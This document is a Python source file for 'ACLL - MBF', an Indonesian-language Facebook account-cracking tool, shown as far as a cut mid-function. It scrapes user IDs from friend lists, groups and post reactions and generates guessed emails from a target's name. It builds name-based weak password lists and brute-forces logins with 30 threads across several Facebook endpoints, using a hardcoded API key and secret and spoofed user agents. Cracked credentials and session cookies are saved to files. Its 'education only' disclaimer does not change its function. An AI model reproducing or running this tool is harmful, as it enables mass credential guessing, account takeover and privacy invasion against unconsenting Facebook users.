# -*- coding: utf-8 -*-
# SOURCE CODE BY ACLL - TOTAL MODERN REWORK
# PERINGATAN: SCRIPT INI HANYA UNTUK TUJUAN PENDIDIKAN DAN KEAMANAN.
# PENGGUNAAN SECARA ILEGAL ADALAH TANGGGUNG JAWAB PENGGUNA.

import os
import sys
import time
import re
import random
import uuid
import json
import requests
import datetime
import hashlib
from collections import deque
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from rich.panel import Panel
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
from rich.text import Text
from rich.table import Table
from rich.layout import Layout
from rich.live import Live
from rich.markup import escape
from rich import box
from rich.align import Align
from rich.padding import Padding

# --- Konfigurasi Tampilan Modern "Green Glass" ---
console = Console()
OK_COLOR = "#00FF7F"  # SpringGreen (Hijau terang)
CP_COLOR = "#FFD700"  # Gold (Kuning)
ERROR_COLOR = "#FF4500" # OrangeRed
INFO_COLOR = "#00FFFF"  # Cyan (Biru kehijauan)
BANNER_GRADIENT_1 = "#00CED1" # DarkTurquoise
BANNER_GRADIENT_2 = "#20B2AA" # LightSeaGreen
BORDER_COLOR = "bold #48D1CC" # MediumTurquoise
TEXT_COLOR = "white"

# --- Inisialisasi Variabel Global ---
user_agents = []
total_ids = []
hasil_ok = []
hasil_cp = []
recent_hits = []

def load_user_agents():
    """Memuat daftar User-Agent dari sumber online."""
    try:
        url = "https://gist.githubusercontent.com/its-me-mahmud/517a36b945b63750ad5e34737c568d71/raw/01a426de5355be32d6657a8a8106d0590a6e0f2f/user-agents.txt"
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        user_agents.extend(line for line in response.text.splitlines() if line.strip())
    except requests.exceptions.RequestException:
        user_agents.extend(["Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"])

class CrackFacebook:
    def __init__(self):
        self.ses = requests.Session()
        self.method = []
        self.nama_pengguna = ""
        self.cookie = {}
        self.token = ""
        self.start_time = 0
        self.loop = 0
        self.status_message = ""
        self.recent_targets = deque(maxlen=10)
        self.file_timestamp = datetime.datetime.now().strftime('%d-%m-%Y_%H-%M-%S')
        os.makedirs("cache", exist_ok=True)
        load_user_agents()

    def clear_screen(self):
        os.system("cls" if os.name == "nt" else "clear")

    def banner(self):
        console.print(Align.center(f"[bold gradient({BANNER_GRADIENT_1}) to {BANNER_GRADIENT_2}]ACL - MBF[/]"))

        logo_text = Text("ACLL", justify="center", style=f"bold gradient({BANNER_GRADIENT_1}) to {BANNER_GRADIENT_2}")
        slogan_text = Text("Precision │ Power │ Privacy", justify="center", style=f"italic {INFO_COLOR}")

        combined_text = Text.assemble(logo_text, "\n\n", slogan_text)

        console.print(
            Panel(
                combined_text,
                width=60,
                padding=(2, 2),
                border_style=BORDER_COLOR,
                box=box.DOUBLE
            ),
            justify="center"
        )
        console.print()

        info_panel = Panel.fit(
            f"[bold {INFO_COLOR}]Author  :[/] [{TEXT_COLOR}]Acill (Dual API Edition)[/]\n"
            f"[bold {INFO_COLOR}]Github  :[/] [{TEXT_COLOR}]github.com/acil-sadboy[/]\n"
            f"[bold {INFO_COLOR}]Version :[/] [{TEXT_COLOR}]15.1 (Dual API Method)[/]",
            title=f"[bold {BORDER_COLOR}]Script Information[/]", border_style=BORDER_COLOR, box=box.ROUNDED
        )
        console.print(info_panel, justify="center")

    def check_internet(self, timeout=5):
        try:
            requests.get("https://www.facebook.com", timeout=timeout)
            return True
        except requests.ConnectionError:
            return False

    def handle_connection_lost(self, live, layout_func):
        self.status_message = f"[bold]{OK_COLOR}Koneksi terputus! Menunggu... ✈️[/]"
        live.update(layout_func())
        while not self.check_internet():
            time.sleep(5)
        self.status_message = f"[bold]{OK_COLOR}Koneksi kembali terhubung! Melanjutkan...[/]"
        live.update(layout_func())
        time.sleep(2)
        self.status_message = ""

    def generate_modern_ua(self):
        devices = {"14": ["SM-S928B", "Pixel 8 Pro"], "13": ["SM-S918U1", "OnePlus 11"]}
        android_version = random.choice(list(devices.keys()))
        model = random.choice(devices[android_version])
        fb_version = f"{random.randint(450, 500)}.0.0.{random.randint(10, 50)}.{random.randint(100, 120)}"
        manufacturer = model.split('-')[0] if model.startswith("SM") else model.split(' ')[0]
        return f"[FBAN/FB4A;FBAV/{fb_version};FBPN/com.facebook.katana;FBLC/id_ID;FBBV/{random.randint(100000000, 999999999)};FBCR/{random.choice(['Telkomsel', 'Indosat'])};FBMF/{manufacturer};FBBD/{manufacturer};FBDV/{model};FBSV/{android_version};FBCA/arm64-v8a:;FBDM/{{density={round(random.uniform(2.5, 3.5), 2)},width={random.choice([1080, 1440])},height={random.choice([2340, 3088])}}};FB_FW/1;]"

    def menu_utama(self):
        self.clear_screen(); self.banner()
        is_token_valid = self._cek_token_valid()
        is_cookie_valid = self._cek_cookie_valid()

        if is_token_valid:
            welcome_msg = f"✨ Selamat datang, [{OK_COLOR}]{escape(self.nama_pengguna)}[/] (Login via Token)."
        elif is_cookie_valid:
            welcome_msg = f"✨ Selamat datang, [{OK_COLOR}]{escape(self.nama_pengguna)}[/] (Login via Cookie)."
        else:
            welcome_msg = f"✨ Selamat datang! Silakan login untuk memulai."

        console.print(Align.center(Padding(welcome_msg, (1, 0))))

        menu_options = (f"[bold]1[/]. Crack dari ID Publik (Via API)\n[bold]2[/]. Crack dari File (ID/Email)\n[bold]3[/]. Cek Hasil CP\n[bold]4[/]. Dump ID Grup Publik\n[bold]5[/]. Dump ID dari Like Postingan\n[bold]6[/]. Crack dari Nama (Auto Generate Email)\n[bold]0[/]. Keluar")
        console.print(Panel(menu_options, title=f"[bold {BORDER_COLOR}]Menu Utama[/]", border_style=BORDER_COLOR, box=box.ROUNDED))
        pilihan = console.input(f"  [{INFO_COLOR}]›[/] Pilih Opsi: ")

        actions = {
            '1': lambda: self.login_via_token(self.crack_publik_api) if not is_token_valid else self.crack_publik_api(),
            '2': self.crack_file,
            '3': self.cek_hasil_cp,
            '4': lambda: self.login_cookie(self.dump_id_grup) if not is_cookie_valid else self.dump_id_grup(),
            '5': lambda: self.login_cookie(self.dump_id_postingan) if not is_cookie_valid else self.dump_id_postingan(),
            '6': self.crack_from_name,
            '0': sys.exit
        }
        action = actions.get(pilihan)
        if action: action()
        else: self.menu_utama()

    def _cek_token_valid(self):
        try:
            self.token = open("cache/.tok.txt", "r").read()
            cok = open("cache/.cok.txt", "r").read()
            self.cookie = {"cookie": cok}
            res = self.ses.get("https://graph.facebook.com/me?fields=name&access_token=" + self.token, cookies=self.cookie).json()
            if "name" in res:
                self.nama_pengguna = res["name"]; return True
            return False
        except (FileNotFoundError, requests.RequestException, json.JSONDecodeError):
            return False

    def _cek_cookie_valid(self):
        try:
            cookie_val = open("cookie.txt", "r").read()
            self.cookie = {"cookie": cookie_val}
            res = self.ses.get("https://m.facebook.com/me", cookies=self.cookie).text
            sop = BeautifulSoup(res, 'html.parser')
            nama = sop.find('title').text
            if "Facebook" in nama or "Masuk" in nama: return False
            self.nama_pengguna = nama; return True
        except (FileNotFoundError, requests.RequestException):
            return False

    def login_via_token(self, after_login_func):
        self.clear_screen(); self.banner()
        console.print(Panel.fit(f"[bold {CP_COLOR}]Fitur ini memerlukan login via cookie untuk mendapatkan token.[/]", border_style=BORDER_COLOR, box=box.ROUNDED))
        cok = console.input(f"  [{INFO_COLOR}]?[/] Masukkan Cookie Facebook : ")
        if not cok: self.login_via_token(after_login_func)

        with console.status("[bold #FFFFFF]Memverifikasi cookie dan mengambil token...", spinner="aesthetic"):
            try:
                self.ses.headers.update({
                    'Accept-Language': 'id,en;q=0.9', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/', 'Host': 'www.facebook.com', 'Sec-Fetch-Mode': 'cors', 'Accept': '*/*', 'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site', 'Sec-Fetch-Dest': 'empty', 'Origin': 'https://www.instagram.com', 'Accept-Encoding': 'gzip, deflate'
                })
                response = self.ses.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/yayanxd_/', cookies={'cookie': cok})
                if '"access_token":' in str(response.headers):
                    token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
                    open("cache/.tok.txt", "w").write(token)
                    open("cache/.cok.txt", "w").write(cok)
                    console.print(f"\n[{OK_COLOR}]Login berhasil![/] Token disimpan.")
                    time.sleep(2)
                    after_login_func()
                else:
                    console.print(f"\n[{ERROR_COLOR}]Login gagal! Silakan gunakan cookie lain.[/]"); time.sleep(3); self.menu_utama()
            except Exception as e:
                console.print(f"\n[{ERROR_COLOR}]Terjadi kesalahan saat login:[/]")
                console.print(e)
                sys.exit()

    def login_cookie(self, after_login_func):
        self.clear_screen(); self.banner()

        login_prompt = Text.from_markup(f"Fitur ini memerlukan login. Harap gunakan akun tumbal untuk keamanan.\nMasukkan cookie Facebook Anda di bawah ini.", justify="center")
        console.print(Panel(login_prompt, title=f"[bold {BORDER_COLOR}]Login via Cookie[/]", border_style=BORDER_COLOR, box=box.ROUNDED))

        cookie_input = console.input(f"  [{INFO_COLOR}]›[/] Masukkan Cookie : ")
        if not cookie_input:
            self.login_cookie(after_login_func)
            return

        with console.status("[bold cyan]Memverifikasi cookie...", spinner="dots") as status:
            try:
                headers = {'User-Agent': random.choice(user_agents)}
                response = self.ses.get("https://www.facebook.com/profile.php", cookies={'cookie': cookie_input}, headers=headers, timeout=15)
                time.sleep(2)

                if "m_basic_logout_button" in response.text or "href=\"/logout.php" in response.text:
                    with open("cookie.txt", "w") as f: f.write(cookie_input)
                    self.cookie = {"cookie": cookie_input}

                    status.update("[bold green]Verifikasi Berhasil![/]")
                    time.sleep(1)

                    self.clear_screen(); self.banner()
                    success_msg = Text.from_markup(f"✅\n\nLogin Berhasil!\nSelamat datang, [bold {OK_COLOR}]{escape(self._get_user_name())}[/].\nAnda akan diarahkan kembali ke menu utama.", justify="center")
                    console.print(Panel(success_msg, border_style=OK_COLOR, box=box.HEAVY))
                    time.sleep(4)
                    self.menu_utama()
                else:
                    status.update("[bold red]Verifikasi Gagal![/]")
                    time.sleep(1)

                    self.clear_screen(); self.banner()
                    fail_msg = Text.from_markup(f"❌\n\nLogin Gagal!\nCookie yang Anda masukkan tidak valid atau telah kedaluwarsa.\nSilakan coba lagi.", justify="center")
                    console.print(Panel(fail_msg, border_style=ERROR_COLOR, box=box.HEAVY))
                    time.sleep(4)
                    self.menu_utama()

            except requests.exceptions.RequestException:
                status.update("[bold red]Koneksi Gagal![/]")
                time.sleep(2)
                sys.exit()

    def _get_user_name(self):
        try:
            res = self.ses.get("https://m.facebook.com/me", cookies=self.cookie).text
            sop = BeautifulSoup(res, 'html.parser')
            return sop.find('title').text
        except:
            return "Pengguna"

    def get_facebook_id(self, username_or_id):
        if username_or_id.isdigit():
            return username_or_id
        if "facebook.com" in username_or_id:
            username = username_or_id.split("/")[-1]
        else:
            username = username_or_id
        url = "https://lookup-id.com/"
        data = {'fburl': f'https://www.facebook.com/{username}', 'check': 'Lookup'}
        try:
            response = requests.post(url, data=data)
            if response.status_code == 200:
                match = re.search(r'<p id="code-wrap"><span id="code">(\d+)</span>', response.text)
                if match:
                    return match.group(1)
                else:
                    return "UserID tidak ditemukan."
            else:
                return f"Gagal mengambil data (Status code: {response.status_code})"
        except Exception as e:
            return f"Terjadi kesalahan: {str(e)}"

    def crack_publik_api(self):
        self.clear_screen(); self.banner()
        global total_ids; total_ids.clear()

        if not self._cek_token_valid():
             console.print(f"[{ERROR_COLOR}]Token tidak valid atau kedaluwarsa.[/]"); time.sleep(3); self.menu_utama(); return

        console.print(f"  [{INFO_COLOR}]masukan username/id, gunakan (,) untuk pemisah.[/]")
        usr = console.input(f"  [{INFO_COLOR}]›[/] User/ID: ")
        user_inputs = [u.strip() for u in usr.split(",") if u.strip()]

        fb_ids = []
        with console.status("[bold cyan]Mengonversi username ke ID...[/]", spinner="dots") as status:
            for u in user_inputs:
                status.update(f"[bold cyan]Mencari ID untuk '{escape(u)}'...[/]")
                id_result = self.get_facebook_id(u)
                if id_result.isdigit():
                    fb_ids.append(id_result)
                else:
                    console.print(f"\n  [{ERROR_COLOR}]![/] Gagal mengambil ID untuk '{escape(u)}': {escape(id_result)}")

        if not fb_ids:
            console.print(f"[{ERROR_COLOR}]Tidak ada ID valid yang bisa diproses.[/]"); time.sleep(3); self.menu_utama(); return

        with console.status(f"[bold cyan]Mengumpulkan teman dari {len(fb_ids)} target...[/]", spinner="dots") as status:
            for xxx in fb_ids:
                try:
                    url = f"https://graph.facebook.com/{xxx}?fields=friends.fields(id,name)&access_token={self.token}"
                    req = self.ses.get(url, cookies=self.cookie).json()
                    if 'friends' in req and 'data' in req['friends']:
                        for x in req['friends']['data']:
                            try:
                                user_id = x["id"]
                                nama = x["name"]
                                formatted_id = f'{user_id}|{nama}'
                                if formatted_id not in total_ids:
                                    total_ids.append(formatted_id)
                                    status.update(f"[bold cyan]Mengumpulkan ({len(total_ids)}) Id...[/]")
                            except KeyError:
                                continue
                    else:
                        console.print(f"\n  [{ERROR_COLOR}]![/] Gagal dump dari UID {escape(xxx)} (Mungkin daftar teman privat)[/]")
                except Exception as e:
                    console.print(f"\n  [{ERROR_COLOR}]![/] Gagal memproses UID {escape(xxx)}:")
                    console.print(e)
                    continue

        if total_ids:
            console.print(f"\n[{OK_COLOR}]✓[/] Total: [bold]{len(total_ids)}[/] ID berhasil dikumpulkan.")
            self.pilih_urutan_crack()
        else:
            console.print(f"\n[{ERROR_COLOR}]Gagal mengumpulkan ID. Pastikan target memiliki teman publik.[/]"); time.sleep(3); self.menu_utama()

    def crack_from_name(self):
        self.clear_screen(); self.banner()
        global total_ids; total_ids.clear()
        nama_target = console.input(f"  [{INFO_COLOR}]?[/] Masukkan Nama Target: ")
        if not nama_target: self.menu_utama()
        try:
            limit_input = console.input(f"  [{INFO_COLOR}]?[/] Berapa limit email (default: 5000): ")
            limit = int(limit_input) if limit_input.isdigit() else 5000
        except ValueError: limit = 5000
        domains = ["gmail.com", "yahoo.com", "hotmail.com", "yahoo.co.id"]
        if console.input(f"  [{INFO_COLOR}]?[/] Tambah domain custom? (y/T): ").lower() == 'y':
            custom_domains = console.input(f"  [{INFO_COLOR}]›[/] Masukkan domain (pisah koma): ")
            domains.extend([d.strip() for d in custom_domains.split(',') if d.strip()])
        with console.status(f"[bold cyan]Membuat {limit} kombinasi email...[/]", spinner="moon"):
            total_ids = self.generate_emails_from_name(nama_target, domains, limit)
        if not total_ids: console.print(f"[{ERROR_COLOR}]Gagal membuat kombinasi email.[/]"); time.sleep(3); self.menu_utama(); return
        console.print(f"[{OK_COLOR}]✓[/] Berhasil membuat [bold]{len(total_ids)}[/] kombinasi email.")
        time.sleep(2)
        self.pwx_name = nama_target
        self.pilih_metode()

    def dump_id_postingan(self):
        self.clear_screen(); self.banner()
        global total_ids; total_ids.clear()
        post_url = console.input(f"  [{INFO_COLOR}]?[/] Masukkan URL Postingan Publik: ")
        try:
            with console.status(f"[bold cyan]Menganalisis link...[/]", spinner="dots") as status:
                headers = {'User-Agent': random.choice(user_agents), 'Cookie': self.cookie['cookie']}
                response = self.ses.get(post_url, headers=headers)
                feedback_id = re.search(r'feedback_target_id":"(\d+)"', response.text)
                if not feedback_id: console.print(f"[{ERROR_COLOR}]Gagal mendapatkan ID Postingan.[/]"); time.sleep(3); return
                feedback_id = feedback_id.group(1)
                status.update(f"[bold cyan]Mengumpulkan ID dari Postingan {escape(feedback_id)}...[/]")
                doc_id = "7709513372428563"
                cursor = None
                while True:
                    variables = {"count": 30, "feed_id": f"feedback:{feedback_id}", "feedback_id": f"feedback:{feedback_id}", "focus_comment_id": None, "scale": 1}
                    if cursor: variables["cursor"] = cursor
                    data = {'doc_id': doc_id, 'variables': json.dumps(variables)}
                    api_response = self.ses.post("https://www.facebook.com/api/graphql/", data=data, headers=headers).json()
                    edges = api_response.get("data", {}).get("feedback", {}).get("reactors", {}).get("edges", [])
                    if not edges: break
                    for edge in edges:
                        node = edge.get("node", {})
                        if node.get("id") and node.get("name"):
                            if f"{node['id']}|{node['name']}" not in total_ids:
                                total_ids.append(f"{node['id']}|{node['name']}")
                                status.update(f"[bold cyan]Mengumpulkan {len(total_ids)} ID...[/]")
                    page_info = api_response.get("data", {}).get("feedback", {}).get("reactors", {}).get("page_info", {})
                    if page_info.get("has_next_page"):
                        cursor = page_info.get("end_cursor"); time.sleep(random.uniform(1, 2))
                    else: break
            if total_ids: console.print(f"\n[{OK_COLOR}]✓[/] Berhasil mengumpulkan [bold]{len(total_ids)}[/] ID."); self.pilih_urutan_crack()
            else: console.print(f"\n[{ERROR_COLOR}]Gagal mengumpulkan ID.[/]"); time.sleep(3); self.menu_utama()
        except Exception as e:
            console.print(f"[{ERROR_COLOR}]Terjadi kesalahan saat dump postingan:[/]")
            console.print(e)
            time.sleep(3)
            self.menu_utama()

    def dump_id_grup(self):
        self.clear_screen(); self.banner()
        global total_ids; total_ids.clear()
        try:
            id_grup = console.input(f"  [{INFO_COLOR}]?[/] Masukkan ID Grup Publik: ")
            url = f"https://mbasic.facebook.com/browse/group/members/?id={id_grup}"
            with console.status(f"[bold cyan]Mulai dump ID dari grup {escape(id_grup)}...[/]", spinner="dots") as status:
                while True:
                    try:
                        response = self.ses.get(url, cookies=self.cookie); response.raise_for_status()
                        soup = BeautifulSoup(response.text, "html.parser")
                        members = soup.find_all("h3")
                        if not members and not total_ids: console.print(f"[{ERROR_COLOR}]Gagal dump. Grup privat/ID salah.[/]"); break
                        for member in members:
                            a_tag = member.find("a")
                            if a_tag and a_tag.has_attr("href"):
                                nama = a_tag.text
                                uid = re.search(r"user/(\d+)|id=(\d+)", a_tag["href"])
                                if uid:
                                    uid = uid.group(1) or uid.group(2)
                                    if f"{uid}|{nama}" not in total_ids:
                                        total_ids.append(f"{uid}|{nama}"); status.update(f"[bold cyan]Mengumpulkan {len(total_ids)} ID...[/]")
                        next_page = soup.find("a", string="Lihat Selengkapnya")
                        if next_page: url = "https://mbasic.facebook.com" + next_page["href"]; time.sleep(random.uniform(1, 2))
                        else: break
                    except requests.exceptions.RequestException: break
            if total_ids: console.print(f"\n[{OK_COLOR}]✓[/] Berhasil mengumpulkan [bold]{len(total_ids)}[/] ID."); self.pilih_urutan_crack()
            else: console.print(f"\n[{ERROR_COLOR}]Gagal mengumpulkan ID.[/]"); time.sleep(3); self.menu_utama()
        except Exception as e:
            console.print(f"[{ERROR_COLOR}]Terjadi kesalahan saat dump grup:[/]")
            console.print(e)
            time.sleep(3)
            self.menu_utama()

    def crack_file(self):
        self.clear_screen(); self.banner()
        global total_ids; total_ids.clear()
        try:
            nama_file = console.input(f"  [{INFO_COLOR}]?[/] Masukkan nama file (Email atau ID): ")
            with open(nama_file, 'r', encoding='utf-8') as f: total_ids.extend(line.strip() for line in f)
            if not total_ids: console.print(f"[{ERROR_COLOR}]File kosong.[/]"); time.sleep(2); self.menu_utama()
            else: self.pilih_urutan_crack()
        except FileNotFoundError: console.print(f"[{ERROR_COLOR}]File tidak ditemukan![/]"); time.sleep(2); self.menu_utama()

    def pilih_urutan_crack(self):
        self.clear_screen(); self.banner()
        console.print(f"[{INFO_COLOR}]Total Target: [bold {CP_COLOR}]{len(total_ids)}[/][/]")
        menu_urut = (
            f"[bold]1[/]. Acak (Disarankan)\n"
            f"[bold]2[/]. Urutkan Muda ke Tua (ID Terkecil Dahulu)\n"
            f"[bold]3[/]. Urutkan Tua ke Muda (ID Terbesar Dahulu)"
        )
        console.print(Panel(menu_urut, title=f"[bold {BORDER_COLOR}]Pilih Urutan Crack[/]", border_style=BORDER_COLOR, box=box.ROUNDED))
        pilihan = console.input(f"  [{INFO_COLOR}]›[/] Pilihan Anda: ")

        try:
            if pilihan == '2':
                console.print(f"[{INFO_COLOR}]Mengurutkan ID dari Muda ke Tua...[/]")
                total_ids.sort(key=lambda x: int(x.split('|')[0]))
            elif pilihan == '3':
                console.print(f"[{INFO_COLOR}]Mengurutkan ID dari Tua ke Muda...[/]")
                total_ids.sort(key=lambda x: int(x.split('|')[0]), reverse=True)
            else:
                console.print(f"[{INFO_COLOR}]Mengacak urutan ID...[/]")
                random.shuffle(total_ids)
        except (ValueError, IndexError):
            console.print(f"[{ERROR_COLOR}]Gagal mengurutkan, format ID tidak valid. Memilih urutan Acak.[/]")
            random.shuffle(total_ids)
            time.sleep(2)
        self.pilih_metode()

    def pilih_metode(self):
        # [MODIFIED] Menu metode diperbarui dengan dua pilihan API
        self.clear_screen(); self.banner()
        metode_panel = (f"[bold]1[/]. B-Graph (Signature) [bold {OK_COLOR}]OPTIMIZED[/]\n"
                        f"[bold]2[/]. B-Graph (Token) [bold {CP_COLOR}]LEGACY[/]\n"
                        f"[bold]3[/]. Mobile (free.facebook.com)\n"
                        f"[bold]4[/]. Mbasic (mbasic.facebook.com)\n"
                        f"[bold]5[/]. Semua Metode (Gabungan) [bold yellow]RECOMMENDED[/]")

        console.print(Panel(metode_panel, title=f"[bold {BORDER_COLOR}]Pilih Metode Crack[/]", border_style=BORDER_COLOR, box=box.ROUNDED))
        pilihan = console.input(f"  [{INFO_COLOR}]›[/] Pilihan Anda: ")
        self.method.clear()
        if pilihan == '1': self.method.append('api_signature')
        elif pilihan == '2': self.method.append('api_legacy')
        elif pilihan == '3': self.method.append('mobile')
        elif pilihan == '4': self.method.append('mbasic')
        elif pilihan == '5': self.method.extend(['api_signature', 'api_legacy', 'mobile', 'mbasic'])
        else:
            console.print(f"[{ERROR_COLOR}]Pilihan tidak valid, menggunakan metode default (Signature).[/]")
            self.method.append('api_signature')
            time.sleep(2)

        self.pengaturan_password()

    def pengaturan_password(self):
        self.clear_screen(); self.banner()
        self.pwx = []
        if console.input(f"  [{INFO_COLOR}]?[/] Gunakan password manual? (y/T): ").lower() == 'y':
            self.pwx.extend(p.strip() for p in console.input(f"  [{INFO_COLOR}]›[/] Masukkan password (pisah koma): ").split(',') if p.strip())
        self.start_crack()

    def generate_emails_from_name(self, nama_target, domains, limit):
        generated_emails = set()
        nama_parts = re.sub(r'[^a-zA-Z0-9\s]', '', nama_target).lower().split()
        if not nama_parts: return []
        firstname = nama_parts[0]
        lastname = nama_parts[-1] if len(nama_parts) > 1 else ""
        cores = {firstname}
        if lastname:
            cores.update({lastname, f"{firstname}{lastname}", f"{firstname}.{lastname}", f"{lastname}{firstname}", f"{lastname}.{firstname}", f"{firstname}_{lastname}", f"{firstname[0]}{lastname}", f"{firstname}{lastname[0]}"})
        suffixes = ["", "123", "12345", "01", "07", "77", "88", "99", "ganteng", "gaming", "id", "real"]
        suffixes.extend([str(y) for y in range(1990, 2006)])
        for core in cores:
            if len(generated_emails) >= limit: break
            for suffix in suffixes:
                if len(generated_emails) >= limit: break
                username = f"{core}{suffix}"
                for domain in domains:
                    generated_emails.add(f"{username}@{domain}")
                    if len(generated_emails) >= limit: break
        if len(generated_emails) < limit and lastname:
            for i in range(1, 201):
                if len(generated_emails) >= limit: break
                for domain in domains:
                    generated_emails.add(f"{firstname}{i}@{domain}"); generated_emails.add(f"{lastname}{i}@{domain}"); generated_emails.add(f"{firstname}{lastname}{i}@{domain}")
                    if len(generated_emails) >= limit: break
        final_list = list(generated_emails)
        random.shuffle(final_list)
        return final_list[:limit]

    def generate_passwords(self, name):
        if not name: return []
        nama_parts = name.lower().split();
        if not nama_parts: return []
        nama_depan = nama_parts[0]
        passwords = [name.lower().replace(' ', ''), nama_depan + '123', nama_depan + '12345']
        if len(nama_parts) > 1:
            nama_belakang = nama_parts[-1]
            passwords.extend([nama_belakang + '123', nama_belakang + '12345', name.lower()])
        return list(dict.fromkeys(passwords))

    def start_crack(self):
        global hasil_ok, hasil_cp, recent_hits; hasil_ok, hasil_cp, recent_hits = [], [], []
        self.loop = 0; self.start_time = time.time(); self.recent_targets.clear()
        if not self.check_internet():
            console.print(f"\n[{ERROR_COLOR}]Tidak ada koneksi internet.[/]")
            return

        ok_file = f"OK-{self.file_timestamp}.txt"; cp_file = f"CP-{self.file_timestamp}.txt"

        progress = Progress(TextColumn("{task.description}"), BarColumn(complete_style=OK_COLOR), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeRemainingColumn(), TextColumn("• Loop: {task.completed}/{task.total}"))
        task_id = progress.add_task(f"[{BANNER_GRADIENT_2}]OK:[bold {OK_COLOR}]0[/] CP:[bold {CP_COLOR}]0[/]", total=len(total_ids))

        with Live(self.generate_layout(progress), screen=True, transient=True, refresh_per_second=10) as live:
            def update_ui():
                live.update(self.generate_layout(progress))

            with ThreadPoolExecutor(max_workers=30) as executor:
                for user_data in total_ids:
                    identifier, name = (user_data.split('|', 1) + [""])[:2] if '|' in user_data else (user_data, getattr(self, 'pwx_name', user_data))
                    password_list = self.generate_passwords(name) + self.pwx + ['bismillah', 'sayang', 'password', '123456']

                    # [MODIFIED] Logika pemanggilan worker disesuaikan
                    if 'api_signature' in self.method: executor.submit(self._method_api_signature, identifier, password_list, task_id, progress, update_ui, ok_file, cp_file)
                    if 'api_legacy' in self.method: executor.submit(self._method_api_legacy, identifier, password_list, task_id, progress, update_ui, ok_file, cp_file)
                    if 'mobile' in self.method: executor.submit(self._method_mobile, identifier, password_list, task_id, progress, update_ui, ok_file, cp_file)
                    if 'mbasic' in self.method: executor.submit(self._method_mbasic, identifier, password_list, task_id, progress, update_ui, ok_file, cp_file)
            executor.shutdown(wait=True)

        self.clear_screen(); self.banner()
        console.print(f"\n[{OK_COLOR}]Proses Selesai.[/]")
        console.print(f"Total Akun OK: [bold {OK_COLOR}]{len(hasil_ok)}[/]")
        console.print(f"Total Akun CP: [bold {CP_COLOR}]{len(hasil_cp)}[/]")
        console.print(f"Hasil disimpan di {ok_file} dan {cp_file}")

    def generate_layout(self, progress) -> Layout:
        layout = Layout(name="root")
        layout.split(
            Layout(self.make_header(), name="header", size=3),
            Layout(name="main"),
            Layout(self.make_footer(), name="footer", size=3)
        )
        layout["main"].split_column(
            Layout(self.make_progress_panel(progress), name="progress", size=5),
            Layout(name="bottom_panels")
        )
        layout["bottom_panels"].split_row(
            Layout(self.make_target_panel(), name="targets", ratio=1),
            Layout(self.make_hits_panel(), name="hits", ratio=2)
        )
        return layout

    def make_header(self):
        return Panel(Text.from_markup(f"[bold {BANNER_GRADIENT_1}]ACLL[/] [white]- [bold {BANNER_GRADIENT_2}]CRACKER[/]"), style="bold", border_style=BORDER_COLOR, title="[bold]CRACKING DASHBOARD[/]", box=box.ROUNDED)

    def make_footer(self):
        elapsed_time = time.time() - self.start_time
        speed = self.loop / elapsed_time if elapsed_time > 0 else 0
        status = self.status_message if self.status_message else f"Waktu Berjalan: {datetime.timedelta(seconds=int(elapsed_time))} | Kecepatan: {speed:.2f} ID/s"
        return Panel(Text(status, justify="center"), border_style=BORDER_COLOR, box=box.ROUNDED)

    def make_progress_panel(self, progress):
        return Panel(progress, title=f"[bold]Progress[/]", border_style=BORDER_COLOR, padding=(1, 2), box=box.ROUNDED)

    def make_target_panel(self):
        if not self.recent_targets:
            content = Text("Menunggu target...", justify="center", style="italic dim")
        else:
            display_list = []
            for i, target in enumerate(self.recent_targets):
                if i == 0:
                    line_text = Text(f"› {target}")
                    line_text.stylize(f"bold {OK_COLOR}", 2)
                else:
                    line_text = Text(f"  {target}")
                    line_text.stylize("dim")
                display_list.append(line_text)
            content = "\n".join(str(line) for line in display_list)

        return Panel(content, title="[bold]Target Dicoba[/]", border_style=INFO_COLOR, padding=(1, 2), box=box.ROUNDED)


    def make_hits_panel(self):
        return Panel(Text.from_markup("\n".join(recent_hits), justify="left"), title="[bold]Hasil Langsung (OK/CP)[/]", border_style=INFO_COLOR, padding=(1, 2), box=box.ROUNDED)

    def _submit_result(self, identifier, password, task_id, progress, update_ui, ok_file, cp_file, session_cookies=None):
        safe_identifier = escape(identifier)
        safe_password = escape(password)
        if identifier in [u.split('|')[0] for u in hasil_ok] or identifier in [u.split('|')[0] for u in hasil_cp]: return

        if session_cookies:
            entry = f"[bold {OK_COLOR}]OK[/] | [{INFO_COLOR}]{safe_identifier}[/] | {safe_password}"
            hasil_ok.append(f"{identifier}|{password}|{session_cookies}");
            with open(ok_file, "a", encoding='utf-8') as f: f.write(f"{identifier}|{password}|{session_cookies}|api\n")
        else:
            entry = f"[bold {CP_COLOR}]CP[/] | [{INFO_COLOR}]{safe_identifier}[/] | {safe_password}"
            hasil_cp.append(f"{identifier}|{password}")
            with open(cp_file, "a", encoding='utf-8') as f: f.write(f"{identifier}|{password}|api\n")

        recent_hits.insert(0, entry)
        if len(recent_hits) > 20: recent_hits.pop()

        progress.update(task_id, description=f"[{BANNER_GRADIENT_2}]OK:[bold {OK_COLOR}]{len(hasil_ok)}[/] CP:[bold {CP_COLOR}]{len(hasil_cp)}[/]")
        update_ui()

    def _method_api_signature(self, identifier, pwx, task_id, progress, update_ui, ok_file, cp_file):
        self.recent_targets.appendleft(identifier)
        for password in pwx:
            if identifier in [u.split('|')[0] for u in hasil_ok] or identifier in [u.split('|')[0] for u in hasil_cp]: break
            retries = 0
            while retries < 3:
                try:
                    ua = self.generate_modern_ua()
                    api_key = "3e7c78e35a76a929930988539da06d3d"
                    secret = "c1e620fa708a1d5696fb991c1bde5662"
                    data = {"api_key": api_key, "credentials_type": "password", "email": identifier, "format": "JSON", "generate_machine_id": "1", "generate_session_cookies": "1", "locale": "id_ID", "method": "auth.login", "password": password, "return_ssl_resources": "0", "v": "1.0"}
